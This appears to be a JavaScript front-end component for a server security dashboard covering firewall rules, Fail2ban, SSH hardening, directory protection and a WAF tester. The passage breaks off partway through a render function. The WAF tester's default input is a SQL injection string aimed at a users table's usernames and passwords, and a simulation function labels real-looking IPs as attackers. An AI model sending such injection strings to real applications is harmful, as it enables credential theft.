/**
 * SPPShield Security Hardening Suite (SPA View Component)
 * Provides comprehensive visual controls for Host & Application Firewalls,
 * Brute-Force Authentication Defense, Malware & Webshell Scanners,
 * 25-Point Automated Security Audits, and SSH Authorized Keys.
 */

const BaseClass = window.BaseComponent || (window.SPPUX && window.SPPUX.BaseComponent) || class {
    constructor(admin, container, props) {
        this.admin = admin;
        this.container = container;
        this.props = props || {};
    }
};

export default class ShieldView extends BaseClass {
    constructor(admin, container, props) {
        super(admin, container, props);
        this.admin = admin;
        window.shieldViewInstance = this;
    }

    async onInit() {
        this.state = {
            activeTab: 'overview',
            loading: true,
            overview: null,
            firewall: null,
            bruteforce: null,
            quarantine: [],
            scanResults: null,
            scanning: false,
            auditResults: null,
            auditing: false,
            sshKeys: [],
            advisorFilter: 'all',
            // Live Threat Radar & WAF Virtual Patching state
            wafRules: [],
            wafThreatLogs: [],
            loadingWaf: false,
            wafInspectPayload: "1' UNION SELECT username, password FROM spp_users--",
            wafInspectResult: null,
            inspectingWaf: false,

            // Hotlink & Directory Privacy state
            hotlinkConfig: null,
            hotlinkRules: null,
            loadingHotlink: false,
            savingHotlink: false,
            privacyDirectories: [],
            loadingPrivacy: false,
            privacyPath: '',
            privacyRealm: 'Restricted Area',
            privacyUser: 'admin',
            privacyPass: '',

            // Ports & Firewall state
            portsData: null,
            loadingPorts: false,
            portInput: '',
            protocolInput: 'tcp',
            portCommentInput: '',

            // Fail2ban state
            fail2banData: null,
            loadingFail2ban: false,

            // SSH Hardening state
            sshHardeningData: null,
            loadingSshHardening: false,
            sshPortInput: 22,
            sshPermitRoot: 'no',
            sshPasswordAuth: 'yes'
        };

        await this.fetchData();
    }

    async fetchData() {
        this.setState({ loading: true });
        try {
            const [ovRes, fwRes, bfRes, quarRes, sshRes] = await Promise.all([
                this.admin.api('shield_overview'),
                this.admin.api('shield_firewall_get'),
                this.admin.api('shield_bruteforce_get'),
                this.admin.api('shield_quarantine_get'),
                this.admin.api('shield_ssh_keys_get')
            ]);

            this.setState({
                overview: (ovRes.success && ovRes.data) ? ovRes.data : ovRes,
                firewall: (fwRes.success && fwRes.data?.status) ? fwRes.data.status : (fwRes.status || {}),
                bruteforce: (bfRes.success && bfRes.data?.stats) ? bfRes.data.stats : (bfRes.stats || {}),
                quarantine: (quarRes.success && quarRes.data?.files) ? quarRes.data.files : (quarRes.files || []),
                sshKeys: (sshRes.success && sshRes.data?.keys) ? sshRes.data.keys : (sshRes.keys || []),
                loading: false
            });
        } catch (e) {
            console.error("Shield fetch error:", e);
            this.admin.notify("Failed to load security suite data: " + e.message, "error");
            this.setState({ loading: false });
        }
    }

    switchTab(tab) {
        this.setState({ activeTab: tab });
        this.update();
        if (tab === 'advisor' && !this.state.auditResults && !this.state.auditing) {
            this.runAudit();
        } else if (tab === 'waf' && (!this.state.wafRules || this.state.wafRules.length === 0)) {
            this.loadWafData();
        } else if (tab === 'privacy' && !this.state.hotlinkConfig) {
            this.fetchPrivacyAndHotlink();
        } else if (tab === 'ports' && !this.state.portsData) {
            this.loadPortsData();
        } else if (tab === 'fail2ban' && !this.state.fail2banData) {
            this.loadFail2banData();
        } else if (tab === 'ssh_hardening' && !this.state.sshHardeningData) {
            this.loadSshHardeningData();
        }
    }

    // ─── PORTS & FIREWALL OPERATIONS ──────────────────────────────────
    async loadPortsData() {
        this.setState({ loadingPorts: true });
        this.update();
        try {
            const res = await this.admin.api('shield_ports_get');
            if (res && res.success) {
                this.setState({ portsData: res.firewall || res.data || res, loadingPorts: false });
            } else {
                this.admin.notify(res.error || "Failed to load firewall status.", "error");
                this.setState({ loadingPorts: false });
            }
        } catch (e) {
            this.admin.notify("Firewall error: " + e.message, "error");
            this.setState({ loadingPorts: false });
        }
        this.update();
    }

    async allowPort(port, protocol = 'tcp', comment = '') {
        const p = port || this.state.portInput;
        const proto = protocol || this.state.protocolInput || 'tcp';
        const comm = comment || this.state.portCommentInput || '';
        if (!p) {
            this.admin.notify("Please specify a port number.", "warning");
            return;
        }
        try {
            const res = await this.admin.api('shield_port_allow', { port: p, protocol: proto, comment: comm });
            if (res && res.success) {
                this.admin.notify(res.message || `Port ${p}/${proto} allowed.`, "success");
                this.setState({ portInput: '', portCommentInput: '' });
                await this.loadPortsData();
            } else {
                this.admin.notify(res.error || "Failed to allow port.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
        this.update();
    }

    async denyPort(port, protocol = 'tcp', comment = '') {
        const p = port || this.state.portInput;
        const proto = protocol || this.state.protocolInput || 'tcp';
        const comm = comment || this.state.portCommentInput || '';
        if (!p) {
            this.admin.notify("Please specify a port number.", "warning");
            return;
        }
        try {
            const res = await this.admin.api('shield_port_deny', { port: p, protocol: proto, comment: comm });
            if (res && res.success) {
                this.admin.notify(res.message || `Port ${p}/${proto} blocked.`, "success");
                this.setState({ portInput: '', portCommentInput: '' });
                await this.loadPortsData();
            } else {
                this.admin.notify(res.error || "Failed to deny port.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
        this.update();
    }

    async deletePortRule(ruleNumber) {
        if (!confirm(`Delete firewall rule #${ruleNumber}?`)) return;
        try {
            const res = await this.admin.api('shield_port_delete', { rule_number: ruleNumber });
            if (res && res.success) {
                this.admin.notify(res.message || `Rule #${ruleNumber} deleted.`, "success");
                await this.loadPortsData();
            } else {
                this.admin.notify(res.error || "Failed to delete rule.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
        this.update();
    }

    // ─── FAIL2BAN OPERATIONS ──────────────────────────────────────────
    async loadFail2banData() {
        this.setState({ loadingFail2ban: true });
        this.update();
        try {
            const res = await this.admin.api('shield_fail2ban_status');
            if (res && res.success) {
                this.setState({ fail2banData: res.fail2ban || res.data || res, loadingFail2ban: false });
            } else {
                this.admin.notify(res.error || "Failed to load Fail2ban status.", "error");
                this.setState({ loadingFail2ban: false });
            }
        } catch (e) {
            this.admin.notify("Fail2ban error: " + e.message, "error");
            this.setState({ loadingFail2ban: false });
        }
        this.update();
    }

    async unbanFail2banIp(jail, ip) {
        if (!confirm(`Unban IP ${ip} from jail '${jail}'?`)) return;
        try {
            const res = await this.admin.api('shield_fail2ban_unban', { jail, ip });
            if (res && res.success) {
                this.admin.notify(res.message || `IP ${ip} unbanned from ${jail}.`, "success");
                await this.loadFail2banData();
            } else {
                this.admin.notify(res.error || "Failed to unban IP.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
        this.update();
    }

    // ─── SSH HARDENING OPERATIONS ─────────────────────────────────────
    async loadSshHardeningData() {
        this.setState({ loadingSshHardening: true });
        this.update();
        try {
            const res = await this.admin.api('shield_ssh_hardening_get');
            if (res && res.success) {
                const cfg = res.config || res.data || res;
                this.setState({
                    sshHardeningData: cfg,
                    sshPortInput: cfg.port || 22,
                    sshPermitRoot: cfg.permit_root_login || 'no',
                    sshPasswordAuth: cfg.password_authentication || 'yes',
                    loadingSshHardening: false
                });
            } else {
                this.admin.notify(res.error || "Failed to load SSH config.", "error");
                this.setState({ loadingSshHardening: false });
            }
        } catch (e) {
            this.admin.notify("SSH hardening error: " + e.message, "error");
            this.setState({ loadingSshHardening: false });
        }
        this.update();
    }

    async saveSshHardening() {
        try {
            const res = await this.admin.api('shield_ssh_hardening_save', {
                port: parseInt(this.state.sshPortInput, 10) || 22,
                permit_root_login: this.state.sshPermitRoot,
                password_authentication: this.state.sshPasswordAuth
            });
            if (res && res.success) {
                this.admin.notify(res.message || "SSH configuration hardened and tested successfully!", "success");
                await this.loadSshHardeningData();
            } else {
                this.admin.notify(res.error || "Failed to save SSH configuration.", "error");
            }
        } catch (e) {
            this.admin.notify("SSH save error: " + e.message, "error");
        }
        this.update();
    }

    // ─── HOTLINK PROTECTION & DIRECTORY PRIVACY OPERATIONS ───────────
    async fetchPrivacyAndHotlink() {
        this.setState({ loadingHotlink: true, loadingPrivacy: true });
        this.update();
        try {
            const [hlRes, privRes] = await Promise.all([
                this.admin.api('shield_hotlink_get'),
                this.admin.api('shield_privacy_list')
            ]);
            this.setState({
                hotlinkConfig: (hlRes && hlRes.success) ? hlRes.config : null,
                hotlinkRules: (hlRes && hlRes.success) ? hlRes.rules : null,
                privacyDirectories: (privRes && privRes.success) ? privRes.directories : [],
                loadingHotlink: false,
                loadingPrivacy: false
            });
        } catch (e) {
            console.error("fetchPrivacyAndHotlink error:", e);
            this.setState({ loadingHotlink: false, loadingPrivacy: false });
        }
        this.update();
    }

    async saveHotlink() {
        this.setState({ savingHotlink: true });
        this.update();
        try {
            const res = await this.admin.api('shield_hotlink_save', this.state.hotlinkConfig);
            if (res && res.success) {
                this.admin.notify(res.message || "Hotlink Protection rules saved!", "success");
                this.setState({
                    hotlinkConfig: res.config,
                    hotlinkRules: res.rules,
                    savingHotlink: false
                });
            } else {
                this.admin.notify(res.error || "Failed to save Hotlink rules.", "error");
                this.setState({ savingHotlink: false });
            }
        } catch (e) {
            this.admin.notify("Hotlink save error: " + e.message, "error");
            this.setState({ savingHotlink: false });
        }
        this.update();
    }

    async saveDirectoryPrivacy() {
        const path = this.state.privacyPath.trim();
        const user = this.state.privacyUser.trim();
        const pass = this.state.privacyPass;
        const realm = this.state.privacyRealm.trim() || 'Protected Area';

        if (!path) {
            this.admin.notify("Please enter a valid directory path (e.g. /private).", "warning");
            return;
        }
        if (!user || !pass) {
            this.admin.notify("Username and password are required.", "warning");
            return;
        }

        try {
            const res = await this.admin.api('shield_privacy_save', {
                path,
                username: user,
                password: pass,
                realm
            });
            if (res && res.success) {
                this.admin.notify(res.message || `Directory '${path}' is now protected!`, "success");
                this.setState({ privacyPath: '', privacyPass: '' });
                const privRes = await this.admin.api('shield_privacy_list');
                if (privRes && privRes.success) {
                    this.setState({ privacyDirectories: privRes.directories });
                }
            } else {
                this.admin.notify(res.error || "Failed to protect directory.", "error");
            }
        } catch (e) {
            this.admin.notify("Directory privacy error: " + e.message, "error");
        }
        this.update();
    }

    async deleteDirectoryPrivacy(path) {
        if (!confirm(`Remove password protection from directory '${path}'?`)) return;
        try {
            const res = await this.admin.api('shield_privacy_delete', { path });
            if (res && res.success) {
                this.admin.notify(res.message || `Protection removed from '${path}'.`, "success");
                const privRes = await this.admin.api('shield_privacy_list');
                if (privRes && privRes.success) {
                    this.setState({ privacyDirectories: privRes.directories });
                }
            } else {
                this.admin.notify(res.error || "Failed to remove protection.", "error");
            }
        } catch (e) {
            this.admin.notify("Delete error: " + e.message, "error");
        }
        this.update();
    }

    async loadWafData() {
        this.setState({ loadingWaf: true });
        this.update();
        try {
            const [wafRes, radarRes] = await Promise.all([
                this.admin.api('shield_waf_patches_list'),
                this.admin.api('shield_threat_radar_feed', { limit: 30 })
            ]);
            this.setState({
                wafRules: (wafRes && wafRes.success) ? Object.values(wafRes.rules || {}) : [],
                wafThreatLogs: (wafRes && wafRes.success) ? (wafRes.threat_logs || []) : [],
                threatRadarFeed: (radarRes && radarRes.success) ? radarRes : null,
                loadingWaf: false
            });
        } catch (e) {
            this.setState({ loadingWaf: false });
            this.admin.notify("Threat Radar load error: " + e.message, "error");
        }
        this.update();
    }

    async progressiveAutoBan(ip) {
        if (!confirm(`Enforce immediate progressive auto-ban on IP '${ip}' across the host firewall?`)) return;
        try {
            const res = await this.admin.api('shield_threat_auto_ban', { ip, reason: 'Manual Threat Radar Progressive Ban' });
            if (res && res.success) {
                this.admin.notify(res.message || `IP ${ip} banned.`, "success");
                await this.loadWafData();
            } else {
                this.admin.notify(res.error || "Auto-ban failed.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async autoQuarantineTarget(path) {
        if (!path || path === '/' || path.startsWith('http')) {
            this.admin.notify("Invalid or empty filesystem target for quarantine.", "warning");
            return;
        }
        if (!confirm(`Quarantine attacked file '${path}' to isolated vault?`)) return;
        try {
            const res = await this.admin.api('shield_threat_quarantine', { target: path });
            if (res && res.success) {
                this.admin.notify(res.message || "Target file quarantined.", "success");
                await this.fetchData();
                await this.loadWafData();
            } else {
                this.admin.notify(res.error || "Quarantine failed.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async clearStrikes(ip) {
        try {
            const res = await this.admin.api('shield_threat_clear_strikes', { ip });
            if (res && res.success) {
                this.admin.notify(res.message || "Strikes cleared.", "success");
                await this.loadWafData();
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async simulateThreatProbe(pool = 'random') {
        this.setState({ simulatingProbe: true });
        this.update();
        const probeIps = [
            { ip: '133.242.18.5', type: 'SQL Injection Probe', severity: 'critical', cat: 'SQLi', target: 'login.php' }, // JP
            { ip: '52.14.88.92', type: 'Path Traversal Scan', severity: 'high', cat: 'LFI', target: 'index.php' }, // US
            { ip: '185.190.140.2', type: 'Log4Shell JNDI Attack', severity: 'critical', cat: 'RCE', target: 'api/v1' }, // EU
            { ip: '177.136.250.8', type: 'Remote Code Execution Stream', severity: 'critical', cat: 'RCE', target: 'upload.php' }, // BR
            { ip: '31.13.72.36', type: 'Credential Stuffing Bot', severity: 'medium', cat: 'Auth', target: 'auth.php' } // GB
        ];
        const selected = (pool === 'random') ? probeIps[Math.floor(Math.random() * probeIps.length)] : probeIps[0];
        try {
            const res = await this.admin.api('shield_threat_strike_record', {
                ip: selected.ip,
                type: selected.type,
                severity: selected.severity,
                details: `Simulated ${selected.cat} attack targetting ${selected.target}`
            });
            if (res && res.success) {
                this.admin.notify(`Simulated intercept from ${res.geo?.flag || '🌐'} ${res.geo?.country || 'Unknown'} (${selected.ip})!`, res.auto_banned ? "danger" : "warning");
                await this.loadWafData();
            }
        } catch (e) {
            this.admin.notify("Simulation error: " + e.message, "error");
        }
        this.setState({ simulatingProbe: false });
        this.update();
    }


    async toggleWafPatch(ruleId, enabled) {
        try {
            const res = await this.admin.api('shield_waf_patch_toggle', {
                rule_id: ruleId,
                enabled: enabled
            });
            if (res && res.success) {
                const updatedRules = (this.state.wafRules || []).map(r => {
                    if (r.id === ruleId) {
                        return { ...r, enabled: enabled };
                    }
                    return r;
                });
                this.setState({ wafRules: updatedRules });
                this.admin.notify(res.message || `Virtual patch ${ruleId} updated.`, "success");
            } else {
                this.admin.notify(res.error || "Failed to toggle rule.", "error");
            }
        } catch (e) {
            this.admin.notify("Toggle error: " + e.message, "error");
        }
        this.update();
    }

    async testWafInspect() {
        const payload = this.state.wafInspectPayload;
        if (!payload) {
            this.admin.notify("Please enter a payload to test.", "warning");
            return;
        }

        this.setState({ inspectingWaf: true, wafInspectResult: null });
        this.update();

        try {
            const res = await this.admin.api('shield_waf_inspect', {
                query: { test_param: payload }
            });
            this.setState({ inspectingWaf: false, wafInspectResult: res });
        } catch (e) {
            this.setState({ inspectingWaf: false });
            this.admin.notify("Inspection error: " + e.message, "error");
        }
        this.update();
    }

    async blockIpFromThreat(ip) {
        if (!ip) return;
        if (!confirm(`Add ${ip} to Host Firewall blocked list?`)) return;
        try {
            const res = await this.admin.api('shield_firewall_block', { ip: ip, reason: 'Blocked from Threat Radar' });
            if (res && res.success) {
                this.admin.notify(`IP ${ip} blocked successfully.`, "success");
                await this.fetchData();
            } else {
                this.admin.notify(res.error || "Failed to block IP.", "error");
            }
        } catch (e) {
            this.admin.notify("Block error: " + e.message, "error");
        }
        this.update();
    }

    render() {
        if (this.state.loading && !this.state.overview) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">🛡️</div>
                    <h3 style="color:var(--text-bright);">Loading SPPShield Security Hardening Suite...</h3>
                    <p style="color:var(--text-dim); font-size:0.85rem;">Inspecting host firewalls, credential guards, and integrity monitors...</p>
                </div>
            `;
        }

        const ov = this.state.overview || {};
        const score = ov.score ?? 85;
        const grade = ov.grade || 'A';
        const gradeColor = (grade === 'A+' || grade === 'A') ? '#34d399' : ((grade === 'B') ? '#38bdf8' : ((grade === 'C') ? '#f59e0b' : '#f87171'));

        return `
            <div class="suite-layout" style="display:flex; flex-direction:column; gap:1.25rem;">
                <!-- Header Toolbar -->
                <div class="suite-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;">
                    <div>
                        <h2 style="margin:0; font-size:1.4rem; color:var(--text-bright); display:flex; align-items:center; gap:0.6rem;">
                            <span>🛡️</span> SPPShield Security Hardening Suite
                        </h2>
                        <p style="margin:0.25rem 0 0 0; font-size:0.85rem; color:var(--text-dim);">
                            Host-level & application firewalls, brute force defense, heuristic malware scanning, and continuous compliance audit.
                        </p>
                    </div>
                    <div style="display:flex; gap:0.5rem; align-items:center;">
                        <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.fetchData(); window.shieldViewInstance.update();">
                            ↻ Refresh
                        </button>
                        <button class="btn primary-btn btn-sm shine-effect" onclick="window.shieldViewInstance.runAudit()">
                            ⚡ Run Security Audit
                        </button>
                    </div>
                </div>

                <!-- Hero Metric Cards -->
                <div class="suite-hero">
                    <div class="suite-stat-card" style="border-left:4px solid ${gradeColor};">
                        <div class="suite-stat-icon" style="background:${gradeColor}22; color:${gradeColor}; font-weight:800; font-size:1.1rem;">
                            ${grade}
                        </div>
                        <div>
                            <div class="suite-stat-value" style="color:${gradeColor};">${score} / 100</div>
                            <div class="suite-stat-label">Security Posture Score</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(239,68,68,0.1); color:#f87171;">🚫</div>
                        <div>
                            <div class="suite-stat-value">${ov.blocked_ips_count ?? 0}</div>
                            <div class="suite-stat-label">Blocked IP Addresses</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(245,158,11,0.1); color:#f59e0b;">🔒</div>
                        <div>
                            <div class="suite-stat-value">${ov.active_lockouts_count ?? 0}</div>
                            <div class="suite-stat-label">Brute-Force Lockouts</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(168,85,247,0.1); color:#c084fc;">☣️</div>
                        <div>
                            <div class="suite-stat-value">${ov.quarantined_files_count ?? 0}</div>
                            <div class="suite-stat-label">Quarantined Files</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(56,189,248,0.1); color:#38bdf8;">🔑</div>
                        <div>
                            <div class="suite-stat-value">${ov.ssh_keys_count ?? 0}</div>
                            <div class="suite-stat-label">SSH Authorized Keys</div>
                        </div>
                    </div>
                </div>

                <!-- Navigation Tabs -->
                <div class="suite-tabs">
                    <button class="suite-tab-btn ${this.state.activeTab === 'overview' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('overview')">
                        📊 Security Posture
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'firewall' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('firewall')">
                        🔥 Firewall & IP Filter (${ov.blocked_ips_count ?? 0})
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'waf' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('waf')">
                        🌐 Live Threat Radar & WAF
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'privacy' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('privacy')">
                        📁 Privacy & Anti-Leech Guard
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'bruteforce' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('bruteforce')">
                        🛡️ Brute-Force Guard (${ov.active_lockouts_count ?? 0})
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'malware' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('malware')">
                        ☣️ Malware & Webshells (${ov.quarantined_files_count ?? 0})
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'advisor' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('advisor')">
                        📑 25-Point Security Advisor
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'ports' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('ports')">
                        🔌 Ports & Firewall
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'fail2ban' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('fail2ban')">
                        🛡️ Fail2ban Jails
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'ssh_hardening' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('ssh_hardening')">
                        🔐 SSH Hardening
                    </button>
                    <button class="suite-tab-btn ${this.state.activeTab === 'ssh' ? 'active' : ''}" onclick="window.shieldViewInstance.switchTab('ssh')">
                        🔑 SSH Key Manager (${ov.ssh_keys_count ?? 0})
                    </button>
                </div>

                <!-- Active Tab Body -->
                ${this.state.activeTab === 'overview' ? this.renderOverviewTab() : ''}
                ${this.state.activeTab === 'ports' ? this.renderPortsTab() : ''}
                ${this.state.activeTab === 'fail2ban' ? this.renderFail2banTab() : ''}
                ${this.state.activeTab === 'ssh_hardening' ? this.renderSshHardeningTab() : ''}
                ${this.state.activeTab === 'firewall' ? this.renderFirewallTab() : ''}
                ${this.state.activeTab === 'waf' ? this.renderThreatRadarTab() : ''}
                ${this.state.activeTab === 'privacy' ? this.renderPrivacyTab() : ''}
                ${this.state.activeTab === 'bruteforce' ? this.renderBruteForceTab() : ''}
                ${this.state.activeTab === 'malware' ? this.renderMalwareTab() : ''}
                ${this.state.activeTab === 'advisor' ? this.renderAdvisorTab() : ''}
                ${this.state.activeTab === 'ssh' ? this.renderSshTab() : ''}
            </div>
        `;
    }

    renderOverviewTab() {
        const ov = this.state.overview || {};
        const recs = ov.top_recommendations || [];
        const authLog = ov.recent_auth_activity || [];

        const recCards = recs.slice(0, 4).map(r => `
            <div style="background:rgba(0,0,0,0.25); border:1px solid var(--glass-border); border-left:3px solid ${r.status === 'critical' ? '#f87171' : '#f59e0b'}; padding:0.85rem; border-radius:var(--radius-sm); margin-bottom:0.6rem;">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <strong style="color:var(--text-bright); font-size:0.9rem;">${this.escapeHtml(r.name)}</strong>
                    <span class="suite-pill ${r.status === 'critical' ? 'suite-pill-danger' : 'suite-pill-warning'}" style="font-size:0.7rem;">
                        ${this.escapeHtml(r.status.toUpperCase())}
                    </span>
                </div>
                <div style="font-size:0.75rem; color:var(--text-dim); margin-top:0.3rem;">${this.escapeHtml(r.description)}</div>
                <div style="font-size:0.75rem; color:#38bdf8; margin-top:0.4rem; font-weight:600;">&rarr; Fix: ${this.escapeHtml(r.recommendation)}</div>
            </div>
        `).join('') || '<div style="color:var(--text-dim); font-size:0.85rem; padding:1rem;">All high-priority recommendations satisfied!</div>';

        const authRows = authLog.slice(0, 8).map(a => `
            <tr>
                <td style="font-family:monospace; font-size:0.8rem; color:var(--text-bright);">${this.escapeHtml(a.ip)}</td>
                <td style="font-size:0.85rem;">${this.escapeHtml(a.username)}</td>
                <td>
                    <span class="suite-pill ${a.success ? 'suite-pill-success' : 'suite-pill-danger'}" style="font-size:0.7rem;">
                        ${a.success ? '✓ Allowed' : '✗ Failed'}
                    </span>
                </td>
                <td style="font-size:0.75rem; color:var(--text-dim);">${this.escapeHtml(a.timestamp)}</td>
            </tr>
        `).join('') || '<tr><td colspan="4" style="text-align:center; color:var(--text-dim);">No recent authentication events recorded.</td></tr>';

        return `
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:1.25rem;">
                <!-- Left: Actionable Hardening Recommendations -->
                <div class="suite-pane-main">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
                        <h3 style="margin:0; font-size:1.05rem; color:var(--text-bright);">Priority Hardening Recommendations</h3>
                        <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.switchTab('advisor')">View All 25 &rarr;</button>
                    </div>
                    ${recCards}
                </div>

                <!-- Right: Real-time Authentication Stream -->
                <div class="suite-pane-main">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
                        <h3 style="margin:0; font-size:1.05rem; color:var(--text-bright);">Recent Authentication Activity</h3>
                        <span class="suite-pill suite-pill-info" style="font-size:0.7rem;">Live Stream</span>
                    </div>
                    <div class="suite-table-wrapper">
                        <table class="suite-table">
                            <thead>
                                <tr>
                                    <th>IP Address</th>
                                    <th>User</th>
                                    <th>Result</th>
                                    <th>Time</th>
                                </tr>
                            </thead>
                            <tbody>${authRows}</tbody>
                        </table>
                    </div>
                </div>
            </div>
        `;
    }

    renderFirewallTab() {
        const fw = this.state.firewall || {};
        const blocked = fw.blocked || [];
        const whitelist = fw.whitelisted || [];

        const blockedRows = blocked.map(b => `
            <tr>
                <td><strong style="color:var(--text-bright); font-family:monospace;">${this.escapeHtml(b.ip)}</strong></td>
                <td style="font-size:0.85rem;">${this.escapeHtml(b.reason)}</td>
                <td style="font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(b.expires_at || 'Permanent')}</td>
                <td style="font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(b.created_at)}</td>
                <td>
                    <button class="btn danger-btn btn-sm" onclick="window.shieldViewInstance.unblockIp('${this.escapeHtml(b.ip)}')">Unblock</button>
                </td>
            </tr>
        `).join('') || '<tr><td colspan="5" style="text-align:center; color:var(--text-dim); padding:2rem;">No IP addresses currently blocked.</td></tr>';

        const whitelistRows = whitelist.map(w => `
            <tr>
                <td><strong style="color:#34d399; font-family:monospace;">${this.escapeHtml(w.ip)}</strong></td>
                <td style="font-size:0.85rem;">${this.escapeHtml(w.note || 'Trusted')}</td>
                <td style="font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(w.created_at || 'N/A')}</td>
                <td>
                    <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.removeWhitelist('${this.escapeHtml(w.ip)}')">Remove</button>
                </td>
            </tr>
        `).join('') || '<tr><td colspan="4" style="text-align:center; color:var(--text-dim); padding:1rem;">No custom whitelisted IPs.</td></tr>';

        return `
            <div class="suite-pane-main">
                <!-- Driver Info Banner -->
                <div style="background:rgba(15,23,42,0.6); padding:1rem 1.25rem; border-radius:var(--radius-md); border:1px solid var(--glass-border); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; margin-bottom:1.25rem;">
                    <div>
                        <strong style="color:var(--text-bright); font-size:0.95rem;">Active Packet Filter: ${this.escapeHtml(fw.driver || 'Application Firewall')}</strong>
                        <div style="font-size:0.75rem; color:var(--text-dim); margin-top:0.2rem;">
                            Host OS: <strong>${fw.os || 'Unknown'}</strong> &bull; Kernel Filtering: <strong>${fw.available ? 'Operational' : 'Fallback Mode'}</strong>
                        </div>
                    </div>
                    <div style="display:flex; gap:0.5rem;">
                        <button class="btn danger-btn btn-sm" onclick="window.shieldViewInstance.openBlockModal()">+ Block IP</button>
                        <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.openWhitelistModal()">+ Add Whitelist</button>
                    </div>
                </div>

                <!-- Blocked IPs Section -->
                <h4 style="margin:0 0 0.5rem 0; font-size:1rem; color:var(--text-bright);">Active IP Banning Table (${blocked.length})</h4>
                <div class="suite-table-wrapper" style="margin-bottom:2rem;">
                    <table class="suite-table">
                        <thead>
                            <tr>
                                <th>Target IP</th>
                                <th>Ban Reason</th>
                                <th>Expires</th>
                                <th>Date Enforced</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>${blockedRows}</tbody>
                    </table>
                </div>

                <!-- Whitelist Table -->
                <h4 style="margin:0 0 0.5rem 0; font-size:1rem; color:var(--text-bright);">Trusted Whitelist (Immune to Auto-Lockout)</h4>
                <div class="suite-table-wrapper">
                    <table class="suite-table">
                        <thead>
                            <tr>
                                <th>Trusted IP</th>
                                <th>Note / Description</th>
                                <th>Added Date</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>${whitelistRows}</tbody>
                    </table>
                </div>
            </div>
        `;
    }

    renderBruteForceTab() {
        const bf = this.state.bruteforce || {};
        const lockouts = bf.active_lockouts || [];
        const history = bf.recent_history || [];

        const lockoutCards = lockouts.map(l => `
            <div style="background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); border-radius:var(--radius-sm); padding:0.85rem; display:flex; justify-content:space-between; align-items:center;">
                <div>
                    <strong style="color:#f87171; font-family:monospace; font-size:0.95rem;">${this.escapeHtml(l.ip)}</strong>
                    <div style="font-size:0.75rem; color:var(--text-dim); margin-top:0.2rem;">
                        Last target user: <strong>${this.escapeHtml(l.last_username || 'admin')}</strong> &bull; Total lockouts: ${l.total_lockouts || 1}
                    </div>
                    <div style="font-size:0.75rem; color:#f59e0b; margin-top:0.2rem;">
                        Unlocks in: <strong>${Math.round((l.seconds_remaining || 0) / 60)} minutes</strong> (${this.escapeHtml(l.unlocks_at || '')})
                    </div>
                </div>
                <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.clearLockout('${this.escapeHtml(l.ip)}')">Unlock Now</button>
            </div>
        `).join('') || '<div style="color:var(--text-dim); font-size:0.85rem; padding:1.5rem; text-align:center; border:1px dashed var(--glass-border); border-radius:var(--radius-sm);">No IP addresses are currently locked out.</div>';

        const historyRows = history.map(h => `
            <tr>
                <td style="font-family:monospace; color:var(--text-bright);">${this.escapeHtml(h.ip)}</td>
                <td>${this.escapeHtml(h.username)}</td>
                <td>
                    <span class="suite-pill ${h.success ? 'suite-pill-success' : 'suite-pill-danger'}" style="font-size:0.7rem;">
                        ${h.success ? 'Success' : 'Failed'}
                    </span>
                </td>
                <td style="font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(h.timestamp)}</td>
            </tr>
        `).join('') || '<tr><td colspan="4" style="text-align:center; color:var(--text-dim);">No login attempts logged.</td></tr>';

